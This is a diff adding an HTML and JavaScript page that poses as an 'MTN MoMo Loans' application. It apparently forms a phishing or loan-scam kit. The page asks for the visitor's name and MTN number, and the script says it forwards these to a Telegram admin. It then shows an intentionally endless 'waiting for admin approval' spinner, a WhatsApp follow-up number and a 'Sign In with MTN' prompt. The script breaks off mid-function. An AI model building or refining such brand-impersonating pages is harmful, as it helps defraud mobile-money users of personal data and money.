@@ -1,1 +1,1262 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="theme-color" content="#ffcc00">
+    <title>MTN MoMo Loans – Fast Micro-Loans</title>
+    <link rel="preconnect" href="https://googleapis.com">
+    <link rel="preconnect" href="https://gstatic.com" crossorigin>
+    <link href="https://googleapis.com/css2?family=Montserrat:ital,wght@0,400;0,500;0,600;0,700;0,800;1,600;1,800&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cloudflare.com">
+    <style>
+        :root {
+            --mtn-yellow: #ffcc00;
+            --mtn-yellow-bright: #ffe033;
+            --mtn-yellow-deep: #ffaa00;
+            --mtn-navy-dark: #00152e;
+            --mtn-navy: #001f3f;
+            --mtn-blue-mid: #003b6f;
+            --mtn-blue-light: #005b9f;
+            --success-green: #1db954;
+            --whatsapp-green: #25d366;
+            --text-white: #ffffff;
+            --text-muted: #dbeafe;
+            --card-white: #ffffff;
+        }
+
+        * {
+            box-sizing: border-box;
+            margin: 0;
+            padding: 0;
+            font-family: 'Montserrat', sans-serif;
+            -webkit-tap-highlight-color: transparent;
+        }
+
+        body {
+            background-color: #07111e;
+            background-image: radial-gradient(circle at 20% 20%, #0d2542 0%, #050c16 100%);
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 16px;
+        }
+
+        /* Main Mobile Frame Container */
+        .app-container {
+            width: 100%;
+            max-width: 420px;
+            min-height: 780px;
+            background: radial-gradient(circle at 85% 25%, var(--mtn-blue-light) 0%, var(--mtn-navy) 55%, var(--mtn-navy-dark) 100%);
+            border-radius: 26px;
+            overflow: hidden;
+            box-shadow: 0 25px 60px rgba(0, 0, 0, 0.75), 0 0 0 1px rgba(255, 204, 0, 0.25);
+            position: relative;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            color: var(--text-white);
+        }
+
+        /* Decorative Diagonal Light Sweep Overlay */
+        .app-container::before {
+            content: "";
+            position: absolute;
+            top: 18%;
+            left: -20%;
+            width: 140%;
+            height: 280px;
+            background: linear-gradient(165deg, rgba(255, 255, 255, 0.06) 0%, rgba(255, 255, 255, 0) 70%);
+            transform: rotate(-12deg);
+            pointer-events: none;
+            z-index: 1;
+        }
+
+        /* Curved Yellow Top Header */
+        .header-wave {
+            background: linear-gradient(135deg, var(--mtn-yellow-bright) 0%, var(--mtn-yellow) 55%, var(--mtn-yellow-deep) 100%);
+            padding: 22px 20px 30px;
+            border-bottom-left-radius: 50% 26px;
+            border-bottom-right-radius: 50% 26px;
+            border-bottom: 5px solid #fff2a6;
+            color: var(--mtn-navy);
+            text-align: center;
+            position: relative;
+            z-index: 3;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.25);
+        }
+
+        .logo-row {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
+
+        .momo-icon-box {
+            background-color: #002b49;
+            color: var(--mtn-yellow);
+            width: 50px;
+            height: 50px;
+            border-radius: 14px 14px 14px 3px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 22px;
+            font-weight: 800;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+            position: relative;
+        }
+
+        .momo-icon-box::after {
+            content: "";
+            width: 7px;
+            height: 7px;
+            background-color: var(--mtn-yellow);
+            border-radius: 50%;
+            position: absolute;
+            right: 11px;
+        }
+
+        .logo-text {
+            text-align: left;
+            line-height: 1.05;
+        }
+
+        .logo-text strong {
+            font-size: 27px;
+            font-weight: 800;
+            display: block;
+            color: #001a35;
+            letter-spacing: -0.5px;
+        }
+
+        .logo-text span {
+            font-size: 13px;
+            font-weight: 700;
+            color: #001a35;
+        }
+
+        .header-divider {
+            width: 2px;
+            height: 38px;
+            background-color: #001a35;
+            margin: 0 4px;
+        }
+
+        .header-sub-title {
+            font-size: 16px;
+            font-weight: 800;
+            text-align: left;
+            line-height: 1.2;
+            color: #001a35;
+            letter-spacing: 0.3px;
+        }
+
+        .pill-banner {
+            background: linear-gradient(180deg, #fff066 0%, var(--mtn-yellow-bright) 100%);
+            color: #001a35;
+            font-weight: 800;
+            font-size: 18px;
+            padding: 8px 24px;
+            border-radius: 30px;
+            display: inline-block;
+            margin-top: 14px;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.18);
+            letter-spacing: 0.6px;
+            border: 1px solid rgba(255, 255, 255, 0.6);
+        }
+
+        /* Screen Switcher */
+        .screen {
+            display: none;
+            flex-direction: column;
+            flex-grow: 1;
+            justify-content: space-between;
+            position: relative;
+            z-index: 2;
+            animation: fadeInScreen 0.3s ease-out;
+        }
+
+        .screen.active {
+            display: flex;
+        }
+
+        @keyframes fadeInScreen {
+            from { opacity: 0; transform: translateY(6px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+        /* ================= SCREEN 1: WELCOME / LANDING ================= */
+        .hero-section {
+            display: flex;
+            align-items: center;
+            padding: 18px 20px 8px;
+            gap: 12px;
+        }
+
+        .hero-visual {
+            width: 45%;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .agent-showcase-card {
+            width: 100%;
+            height: 225px;
+            background: linear-gradient(165deg, rgba(255, 204, 0, 0.25) 0%, rgba(0, 43, 85, 0.9) 100%);
+            border: 2.5px solid var(--mtn-yellow);
+            border-radius: 20px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            padding: 14px 10px;
+            box-shadow: 0 12px 24px rgba(0, 0, 0, 0.35);
+            position: relative;
+        }
+
+        .phone-mockup-icon {
+            width: 68px;
+            height: 112px;
+            background-color: #0b192c;
+            border: 3px solid var(--mtn-yellow);
+            border-radius: 14px;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            gap: 6px;
+            box-shadow: 0 6px 14px rgba(0, 0, 0, 0.4);
+        }
+
+        .mtn-oval-badge {
+            border: 2px solid #001a35;
+            background-color: var(--mtn-yellow);
+            color: #001a35;
+            font-weight: 800;
+            font-size: 11px;
+            padding: 2px 10px;
+            border-radius: 50%;
+            letter-spacing: 0.5px;
+        }
+
+        .agent-shirt-tag {
+            margin-top: 12px;
+            background-color: var(--mtn-yellow);
+            color: #001a35;
+            font-size: 11px;
+            font-weight: 800;
+            padding: 4px 12px;
+            border-radius: 20px;
+        }
+
+        .hero-text {
+            width: 55%;
+            text-align: center;
+        }
+
+        .mtn-line-title {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            color: var(--mtn-yellow);
+            font-weight: 800;
+            font-size: 19px;
+            margin-bottom: 8px;
+        }
+
+        .mtn-line-title::before,
+        .mtn-line-title::after {
+            content: "";
+            height: 2px;
+            width: 26px;
+            background-color: var(--mtn-yellow);
+        }
+
+        .hero-text h1 {
+            font-size: 25px;
+            font-weight: 800;
+            line-height: 1.25;
+            color: var(--text-white);
+            text-shadow: 0 2px 8px rgba(0, 0, 0, 0.4);
+        }
+
+        .hero-text h1 span {
+            color: var(--mtn-yellow);
+            display: block;
+            font-size: 28px;
+            margin: 2px 0;
+        }
+
+        .sub-caption {
+            text-align: center;
+            font-size: 14.5px;
+            line-height: 1.5;
+            padding: 12px 26px;
+            color: var(--text-muted);
+            font-weight: 500;
+        }
+
+        .features-row {
+            display: flex;
+            align-items: center;
+            justify-content: space-around;
+            padding: 12px 16px;
+            margin: 4px 14px;
+            background: rgba(0, 21, 46, 0.45);
+            border-radius: 18px;
+            border: 1px solid rgba(255, 204, 0, 0.25);
+        }
+
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+        }
+
+        .feature-circle {
+            width: 48px;
+            height: 48px;
+            border-radius: 50%;
+            background: var(--mtn-navy);
+            border: 3px solid var(--mtn-yellow);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: var(--mtn-yellow);
+            font-size: 20px;
+            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.3);
+        }
+
+        .feature-label {
+            font-size: 13px;
+            font-weight: 700;
+            line-height: 1.25;
+            color: var(--text-white);
+        }
+
+        .feature-divider {
+            width: 2px;
+            height: 42px;
+            background-color: var(--mtn-yellow);
+        }
+
+        /* ================= SCREEN 2: LOAN APPLICATION FORM ================= */
+        .form-header-text {
+            text-align: center;
+            padding: 12px 18px 8px;
+        }
+
+        .form-header-text h2 {
+            font-size: 26px;
+            font-weight: 800;
+            color: var(--text-white);
+            margin-bottom: 4px;
+            text-shadow: 0 2px 6px rgba(0, 0, 0, 0.35);
+        }
+
+        .form-header-text p {
+            font-size: 13px;
+            font-style: italic;
+            font-weight: 600;
+            color: var(--mtn-yellow);
+            line-height: 1.35;
+        }
+
+        .form-card {
+            background-color: var(--card-white);
+            color: var(--mtn-navy);
+            margin: 6px 16px;
+            border-radius: 22px;
+            padding: 16px 15px 15px;
+            box-shadow: 0 12px 28px rgba(0, 0, 0, 0.4);
+        }
+
+        .form-group {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 12px;
+        }
+
+        .form-icon-circle {
+            width: 36px;
+            height: 36px;
+            border-radius: 50%;
+            background-color: var(--mtn-navy);
+            color: var(--text-white);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 15px;
+            margin-top: 19px;
+            flex-shrink: 0;
+            box-shadow: 0 3px 6px rgba(0, 31, 63, 0.25);
+        }
+
+        .ugx-bag-icon {
+            background-color: var(--mtn-navy);
+            color: var(--mtn-yellow);
+            font-size: 9px;
+            font-weight: 800;
+            border-radius: 10px 10px 15px 15px;
+            border-top: 3px solid var(--mtn-yellow);
+        }
+
+        .input-wrapper {
+            flex-grow: 1;
+        }
+
+        .input-wrapper label {
+            display: block;
+            font-size: 13px;
+            font-weight: 700;
+            color: var(--mtn-navy);
+            margin-bottom: 4px;
+        }
+
+        .input-wrapper input,
+        .input-wrapper select {
+            width: 100%;
+            padding: 10px 12px;
+            border-radius: 9px;
+            font-size: 13.5px;
+            font-weight: 600;
+            color: var(--mtn-navy);
+            background-color: #f8fafc;
+            outline: none;
+            transition: border-color 0.2s ease, box-shadow 0.2s ease;
+        }
+
+        .input-wrapper input {
+            border: 1.5px solid #94a3b8;
+        }
+
+        .input-wrapper input:focus {
+            border-color: var(--mtn-navy);
+            background-color: #ffffff;
+            box-shadow: 0 0 0 3px rgba(0, 31, 63, 0.12);
+        }
+
+        .input-wrapper select {
+            border: 1.5px solid var(--mtn-yellow);
+            background-color: #ffffff;
+            cursor: pointer;
+        }
+
+        .input-wrapper select:focus {
+            border-color: var(--mtn-yellow-deep);
+            box-shadow: 0 0 0 3px rgba(255, 204, 0, 0.25);
+        }
+
+        .form-submit-btn {
+            width: 100%;
+            background: linear-gradient(180deg, var(--mtn-yellow-bright) 0%, #ffbb00 100%);
+            color: var(--mtn-navy);
+            border: 1.5px solid #fff099;
+            border-radius: 30px;
+            padding: 13px;
+            font-size: 18px;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 8px;
+            box-shadow: 0 5px 15px rgba(255, 187, 0, 0.45);
+            transition: transform 0.15s ease;
+        }
+
+        .form-submit-btn:active {
+            transform: scale(0.98);
+        }
+
+        .form-submit-btn:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+        }
+        .wa-banner-large {
+            border: 1.5px solid var(--mtn-yellow);
+            background: rgba(0, 20, 45, 0.8);
+            border-radius: 16px;
+            margin: 8px 16px;
+            padding: 10px 12px;
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+
+        .wa-circle-lg {
+            width: 44px;
+            height: 44px;
+            background-color: var(--whatsapp-green);
+            border: 2px solid #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 24px;
+            color: #ffffff;
+            flex-shrink: 0;
+        }
+
+        .wa-banner-info {
+            border-left: 2px solid var(--mtn-yellow);
+            padding-left: 10px;
+            text-align: center;
+            flex-grow: 1;
+        }
+
+        .wa-banner-info small {
+            display: block;
+            font-size: 11px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .wa-banner-info a {
+            display: block;
+            font-size: 18px;
+            font-weight: 800;
+            color: var(--mtn-yellow);
+            text-decoration: none;
+            margin: 1px 0;
+        }
+
+        .wa-banner-info span {
+            display: block;
+            font-size: 11px;
+            color: #e2e8f0;
+        }
+
+        .bottom-trust-bar {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            padding: 6px 14px 14px;
+            font-size: 10px;
+            font-weight: 700;
+            color: #ffffff;
+        }
+
+        .trust-item {
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+
+        .trust-item i {
+            color: var(--mtn-yellow);
+            font-size: 14px;
+        }
+
+        .trust-sep {
+            width: 1.5px;
+            height: 18px;
+            background-color: var(--mtn-yellow);
+        }
+
+        /* ================= SCREEN 3: INFINITE APPROVAL SPINNER ================= */
+        .approval-body {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            padding: 24px 22px;
+        }
+
+        .loader-ring {
+            position: relative;
+            width: 145px;
+            height: 145px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            margin-bottom: 24px;
+        }
+
+        .spinner-ticks {
+            position: absolute;
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            border: 12px dashed var(--mtn-yellow);
+            animation: spinForever 4s linear infinite;
+            will-change: transform;
+        }
+
+        @keyframes spinForever {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .hourglass-icon {
+            font-size: 46px;
+            color: var(--mtn-yellow);
+            position: relative;
+            z-index: 2;
+            animation: flipHourglass 2.5s ease-in-out infinite;
+            text-shadow: 0 0 14px rgba(255, 204, 0, 0.45);
+        }
+
+        @keyframes flipHourglass {
+            0%, 40% { transform: rotate(0deg); }
+            50%, 90% { transform: rotate(180deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .status-pill {
+            background-color: var(--mtn-yellow-bright);
+            color: var(--mtn-navy);
+            font-weight: 800;
+            font-size: 18px;
+            padding: 11px 24px;
+            border-radius: 30px;
+            margin-bottom: 18px;
+            box-shadow: 0 4px 14px rgba(0, 0, 0, 0.25);
+        }
+
+        .status-message {
+            font-size: 15px;
+            line-height: 1.55;
+            color: #f8fafc;
+            margin-bottom: 24px;
+            padding: 0 6px;
+        }
+
+        .status-message strong {
+            color: var(--mtn-yellow);
+        }
+
+        .patience-card {
+            width: 100%;
+            border: 2px solid var(--mtn-yellow);
+            background: rgba(0, 20, 45, 0.7);
+            border-radius: 18px;
+            padding: 14px 16px;
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            text-align: left;
+            margin-bottom: 22px;
+        }
+
+        .shield-badge {
+            width: 44px;
+            height: 44px;
+            background-color: #ffffff;
+            color: var(--mtn-navy);
+            border-radius: 50% 50% 50% 50% / 35% 35% 65% 65%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 20px;
+            flex-shrink: 0;
+        }
+
+        .patience-divider {
+            width: 2px;
+            height: 40px;
+            background-color: var(--mtn-yellow);
+            flex-shrink: 0;
+        }
+
+        .patience-text h3 {
+            font-size: 16px;
+            font-weight: 700;
+            margin-bottom: 3px;
+        }
+
+        .patience-text p {
+            font-size: 12px;
+            color: #e2e8f0;
+        }
+
+        .live-poll-badge {
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            background: rgba(255, 204, 0, 0.14);
+            border: 1px solid rgba(255, 204, 0, 0.45);
+            color: var(--mtn-yellow);
+            font-size: 11.5px;
+            font-weight: 700;
+            padding: 6px 14px;
+            border-radius: 20px;
+            margin-bottom: 18px;
+        }
+
+        .live-dot {
+            width: 8px;
+            height: 8px;
+            background-color: var(--mtn-yellow);
+            border-radius: 50%;
+            animation: pulseDot 1.2s ease-in-out infinite;
+        }
+
+        @keyframes pulseDot {
+            0%, 100% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.35; transform: scale(0.75); }
+        }
+
+        .thank-you-highlight {
+            color: var(--mtn-yellow);
+            font-style: italic;
+            font-weight: 800;
+            font-size: 17px;
+            line-height: 1.4;
+        }
+
+        /* ================= SCREEN 4: APPLICATION SUCCESSFUL ================= */
+        .success-section {
+            text-align: center;
+            padding: 12px 20px 6px;
+        }
+
+        .check-badge-wrapper {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 14px;
+            margin-bottom: 8px;
+        }
+
+        .spark-lines {
+            color: var(--mtn-yellow);
+            font-size: 22px;
+            font-weight: 800;
+            line-height: 0.7;
+        }
+
+        .green-check-circle {
+            width: 64px;
+            height: 64px;
+            background-color: var(--success-green);
+            border: 3px solid #ffffff;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 32px;
+            color: #ffffff;
+            box-shadow: 0 0 22px rgba(29, 185, 84, 0.75);
+        }
+
+        .success-banner {
+            background-color: var(--mtn-yellow-bright);
+            color: var(--mtn-navy);
+            font-weight: 800;
+            font-size: 20px;
+            padding: 7px 24px;
+            border-radius: 30px;
+            display: inline-block;
+            margin-bottom: 8px;
+        }
+
+        .success-desc {
+            font-size: 13px;
+            line-height: 1.4;
+            color: #f0f4f8;
+            padding: 0 10px;
+        }
+
+        .summary-card {
+            background-color: var(--card-white);
+            color: var(--mtn-navy);
+            margin: 10px 18px;
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 8px 22px rgba(0, 0, 0, 0.35);
+        }
+
+        .summary-header {
+            background-color: var(--mtn-yellow-bright);
+            text-align: center;
+            font-weight: 800;
+            font-size: 16px;
+            padding: 9px;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 9px 14px;
+            border-bottom: 1px solid #e2e8f0;
+            font-size: 13px;
+        }
+
+        .summary-row:last-child {
+            border-bottom: none;
+        }
+
+        .summary-label {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-weight: 600;
+            color: #1e293b;
+        }
+
+        .summary-label i {
+            color: var(--mtn-navy);
+            width: 16px;
+            text-align: center;
+        }
+
+        .summary-value {
+            font-weight: 800;
+            color: var(--mtn-navy);
+        }
+
+        /* Shared Buttons & Footer */
+        .cta-btn {
+            background: linear-gradient(180deg, var(--mtn-yellow-bright) 0%, #ffbb00 100%);
+            color: var(--mtn-navy);
+            border: 2px solid #fff099;
+            border-radius: 40px;
+            padding: 13px 24px;
+            margin: 8px 22px;
+            font-size: 19px;
+            font-weight: 800;
+            cursor: pointer;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+            box-shadow: 0 6px 18px rgba(0, 0, 0, 0.35);
+            transition: transform 0.15s ease;
+        }
+
+        .cta-btn:active {
+            transform: scale(0.98);
+        }
+
+        .mtn-btn-badge {
+            border: 2px solid var(--mtn-navy);
+            border-radius: 50%;
+            padding: 2px 10px;
+            font-size: 14px;
+            font-weight: 800;
+        }
+
+        .btn-sep {
+            width: 2px;
+            height: 22px;
+            background-color: var(--mtn-navy);
+        }
+
+<body>
+    <div class="app-container">
+
+        <!-- ================= SCREEN 1: WELCOME ================= -->
+        <div id="page1" class="screen active">
+            <div>
+                <div class="header-wave">
+                    <div class="logo-row">
+                        <div class="momo-icon-box"><i class="fa-solid fa-play"></i></div>
+                        <div class="logo-text">
+                            <strong>MoMo</strong>
+                            <span>from MTN</span>
+                        </div>
+                    </div>
+                    <div class="pill-banner">MTN MOMO LOANS</div>
+                </div>
+
+                <div class="hero-section">
+                    <div class="hero-visual">
+                        <div class="agent-showcase-card">
+                            <div class="phone-mockup-icon">
+                                <i class="fa-solid fa-wallet" style="font-size: 26px; color: #ffcc00;"></i>
+                                <div class="mtn-oval-badge">MTN</div>
+                            </div>
+                            <div class="agent-shirt-tag">MTN MoMo Wallet</div>
+                        </div>
+                    </div>
+                    <div class="hero-text">
+                        <div class="mtn-line-title">MTN</div>
+                        <h1>Welcome to <span>MTN MoMo</span> Loan Application</h1>
+                    </div>
+                </div>
+
+                <p class="sub-caption">
+                    Get quick micro-loans deposited straight into your mobile money wallet.
+                </p>
+
+                <div class="features-row">
+                    <div class="feature-item">
+                        <div class="feature-circle"><i class="fa-solid fa-bolt"></i></div>
+                        <div class="feature-label">Fast<br>Approval</div>
+                    </div>
+                    <div class="feature-divider"></div>
+                    <div class="feature-item">
+                        <div class="feature-circle"><i class="fa-solid fa-shield-halved"></i></div>
+                        <div class="feature-label">Secure &<br>Safe</div>
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <button class="cta-btn" onclick="switchPage('pageForm')">
+                    Apply Now <i class="fa-solid fa-arrow-right"></i>
+                </button>
+                <div class="footer-wave"></div>
+            </div>
+        </div>
+
+        <!-- ================= SCREEN 2: APPLICATION FORM ================= -->
+        <div id="pageForm" class="screen">
+            <div>
+                <div class="header-wave" style="padding-bottom: 22px;">
+                    <div class="logo-row">
+                        <div class="momo-icon-box"><i class="fa-solid fa-play"></i></div>
+                        <div class="logo-text">
+                            <strong>MoMo</strong>
+                            <span>from MTN</span>
+                        </div>
+                        <div class="header-divider"></div>
+                        <div class="header-sub-title">MTN MOMO<br>LOANS</div>
+                    </div>
+                </div>
+
+                <div class="form-header-text">
+                    <h2>Loan Application</h2>
+                    <p>Get quick micro-loans deposited straight into your mobile money wallet.</p>
+                </div>
+
+                <form id="loanApplicationForm" class="form-card" onsubmit="submitApplication(event)">
+                    <div class="form-group">
+                        <div class="form-icon-circle"><i class="fa-solid fa-user"></i></div>
+                        <div class="input-wrapper">
+                            <label for="fullName">Full Name</label>
+                            <input type="text" id="fullName" name="fullName" placeholder="Enter your full name" autocomplete="name" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="form-icon-circle"><i class="fa-solid fa-phone"></i></div>
+                        <div class="input-wrapper">
+                            <label for="mtnNumber">MTN Mobile Number</label>
+                            <input type="tel" id="mtnNumber" name="mtnNumber" placeholder="07XXXXXXXX" autocomplete="tel" required>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="form-icon-circle"><i class="fa-solid fa-border-all"></i></div>
+                        <div class="input-wrapper">
+                            <label for="loanService">Select Loan Service</label>
+                            <select id="loanService" name="loanService" required>
+                                <option value="" disabled selected>Choose a service</option>
+                                <option value="MoMo Advance">MoMo Advance</option>
+                                <option value="Quick Personal Loan">Quick Personal Loan</option>
+                                <option value="Business Boost Loan">Business Boost Loan</option>
+                                <option value="Emergency Micro-Loan">Emergency Micro-Loan</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-group">
+                        <div class="form-icon-circle ugx-bag-icon">UGX</div>
+                        <div class="input-wrapper">
+                            <label for="loanAmount">Select Loan Amount (UGX)</label>
+                            <select id="loanAmount" name="loanAmount" required>
+                                <option value="" disabled selected>Choose an amount</option>
+                                <option value="UGX 500,000">UGX 500,000</option>
+                                <option value="UGX 1,000,000">UGX 1,000,000</option>
+                                <option value="UGX 2,000,000">UGX 2,000,000</option>
+                                <option value="UGX 4,000,000">UGX 4,000,000</option>
+                                <option value="UGX 5,000,000">UGX 5,000,000</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <div class="form-group" style="margin-bottom: 8px;">
+                        <div class="form-icon-circle"><i class="fa-solid fa-calendar-days"></i></div>
+                        <div class="input-wrapper">
+                            <label for="repaymentPeriod">Repayment Period</label>
+                            <select id="repaymentPeriod" name="repaymentPeriod" required>
+                                <option value="" disabled selected>Choose period</option>
+                                <option value="3 Months">3 Months</option>
+                                <option value="6 Months">6 Months</option>
+                                <option value="12 Months">12 Months</option>
+                                <option value="24 Months">24 Months</option>
+                            </select>
+                        </div>
+                    </div>
+
+                    <button type="submit" id="submitBtn" class="form-submit-btn">
+                        Continue <i class="fa-solid fa-arrow-right"></i>
+                    </button>
+                </form>
+            </div>
+
+            <div>
+                <div class="wa-banner-large">
+                    <div class="wa-circle-lg"><i class="fa-brands fa-whatsapp"></i></div>
+                    <div class="wa-banner-info">
+                        <small>WhatsApp Support – Application Follow-Up</small>
+                        <a href="https://wa.me" target="_blank" rel="noopener">+256 778 260 593</a>
+                        <span>Chat with us for assistance</span>
+                    </div>
+                </div>
+
+                <div class="bottom-trust-bar">
+                    <div class="trust-item"><i class="fa-solid fa-bolt"></i> Fast Approval</div>
+                    <div class="trust-sep"></div>
+                    <div class="trust-item"><i class="fa-solid fa-circle-check"></i> Secure & Safe</div>
+                    <div class="trust-sep"></div>
+                    <div class="trust-item"><i class="fa-solid fa-handshake"></i> Your Trust, Our Priority</div>
+                </div>
+            </div>
+        </div>
+              <!-- ================= SCREEN 3: WAITING FOR ADMIN APPROVAL ================= -->
+        <div id="page3" class="screen">
+            <div>
+                <div class="header-wave" style="padding-bottom: 24px;">
+                    <div class="logo-row">
+                        <div class="momo-icon-box"><i class="fa-solid fa-play"></i></div>
+                        <div class="logo-text">
+                            <strong>MoMo</strong>
+                            <span>from MTN</span>
+                        </div>
+                        <div class="header-divider"></div>
+                        <div class="header-sub-title">MTN MOMO<br>LOANS</div>
+                    </div>
+                </div>
+
+                <div class="approval-body">
+                    <div class="loader-ring">
+                        <div class="spinner-ticks"></div>
+                        <div class="hourglass-icon">
+                            <i class="fa-solid fa-hourglass-half"></i>
+                        </div>
+                    </div>
+
+                    <div class="status-pill">Waiting for Admin Approval</div>
+
+                    <p class="status-message">
+                        Your loan application has been submitted and is now <strong>under review</strong> by our admin team.
+                    </p>
+
+                    <div class="patience-card">
+                        <div class="shield-badge">
+                            <i class="fa-solid fa-check"></i>
+                        </div>
+                        <div class="patience-divider"></div>
+                        <div class="patience-text">
+                            <h3>Please be patient...</h3>
+                            <p>This process usually takes a few minutes.</p>
+                        </div>
+                    </div>
+
+                    <div class="live-poll-badge">
+                        <span class="live-dot"></span>
+                        <span id="liveStatusText">Awaiting admin verification...</span>
+                    </div>
+
+                    <div class="thank-you-highlight">
+                        Thank you for choosing<br>MTN MoMo Loans!
+                    </div>
+                </div>
+            </div>
+
+            <div class="footer-wave"></div>
+        </div>
+
+        <!-- ================= SCREEN 4: APPLICATION SUCCESSFUL ================= -->
+        <div id="page4" class="screen">
+            <div>
+                <div class="header-wave" style="padding-bottom: 24px;">
+                    <div class="logo-row">
+                        <div class="momo-icon-box"><i class="fa-solid fa-play"></i></div>
+                        <div class="logo-text">
+                            <strong>MoMo</strong>
+                            <span>from MTN</span>
+                        </div>
+                        <div class="header-divider"></div>
+                        <div class="header-sub-title">MTN MoMo<br>Loans</div>
+                    </div>
+                </div>
+
+                <div class="success-section">
+                    <div class="check-badge-wrapper">
+                        <div class="spark-lines">\ ― /</div>
+                        <div class="green-check-circle"><i class="fa-solid fa-check"></i></div>
+                        <div class="spark-lines">/ ― \</div>
+                    </div>
+                    <div class="success-banner">Application Successful!</div>
+                    <p class="success-desc">
+                        Your loan application has been approved and processed. Your summary is below.
+                    </p>
+                </div>
+
+                <div class="summary-card">
+                    <div class="summary-header">Application Summary</div>
+                    <div class="summary-row">
+                        <div class="summary-label"><i class="fa-solid fa-user"></i> Full Name:</div>
+                        <div class="summary-value" id="sumName">John Doe</div>
+                    </div>
+                    <div class="summary-row">
+                        <div class="summary-label"><i class="fa-solid fa-phone"></i> MTN Number:</div>
+                        <div class="summary-value" id="sumPhone">0778260593</div>
+                    </div>
+                    <div class="summary-row">
+                        <div class="summary-label"><i class="fa-solid fa-sack-dollar"></i> Loan Amount:</div>
+                        <div class="summary-value" id="sumAmount">UGX 4,000,000</div>
+                    </div>
+                    <div class="summary-row">
+                        <div class="summary-label"><i class="fa-solid fa-calendar-days"></i> Repayment Period:</div>
+                        <div class="summary-value" id="sumPeriod">24 Months</div>
+                    </div>
+                    <div class="summary-row">
+                        <div class="summary-label"><i class="fa-solid fa-border-all"></i> Loan Service:</div>
+                        <div class="summary-value" id="sumService">MoMo Advance</div>
+                    </div>
+                </div>
+            </div>
+
+            <div>
+                <button class="cta-btn" onclick="resetAndReturnHome()" style="font-size: 16px; padding: 12px 20px;">
+                    <span class="mtn-btn-badge">MTN</span>
+                    <span class="btn-sep"></span>
+                    Sign In with MTN <i class="fa-solid fa-arrow-right"></i>
+                </button>
+
+                <div class="tagline-dots">Secure • Fast • Reliable</div>
+
+                <div class="whatsapp-box">
+                    <div class="wa-icon"><i class="fa-brands fa-whatsapp"></i></div>
+                    <div class="wa-text">
+                        <strong>Need Help?</strong>
+                        Chat with us on WhatsApp
+                    </div>
+                    <a href="https://wa.me" target="_blank" rel="noopener" class="wa-phone-pill">+256 778 260 593</a>
+                </div>
+
+                <div class="footer-wave">
+                    <span class="line"></span> Thank you for choosing MTN MoMo Loans! <span class="line"></span>
+                </div>
+            </div>
+        </div>
+
+    </div>
+<script>
+    let pollTimer = null;
+    let activeApplicationId = null;
+
+    // Switch visible screen and stop any active polling when leaving the spinner screen
+    function switchPage(pageId) {
+        if (pageId !== 'page3' && pollTimer) {
+            clearInterval(pollTimer);
+            pollTimer = null;
+        }
+        document.querySelectorAll('.screen').forEach(screen => {
+            screen.classList.remove('active');
+        });
+        document.getElementById(pageId).classList.add('active');
+    }
+
+    // Reset form and return to Welcome Screen
+    function resetAndReturnHome() {
+        activeApplicationId = null;
+        document.getElementById('loanApplicationForm').reset();
+        switchPage('page1');
+    }
+
+    // Submit Loan Application to Backend API (which forwards to Telegram Admin)
+    async function submitApplication(event) {
+        event.preventDefault();
+
+        const btn = document.getElementById('submitBtn');
+        const originalText = btn.innerHTML;
+        btn.innerHTML = 'Submitting... <i class="fa-solid fa-spinner fa-spin"></i>';
+        btn.disabled = true;
+
+        const payload = {
+            fullName: document.getElementById('fullName').value.trim(),
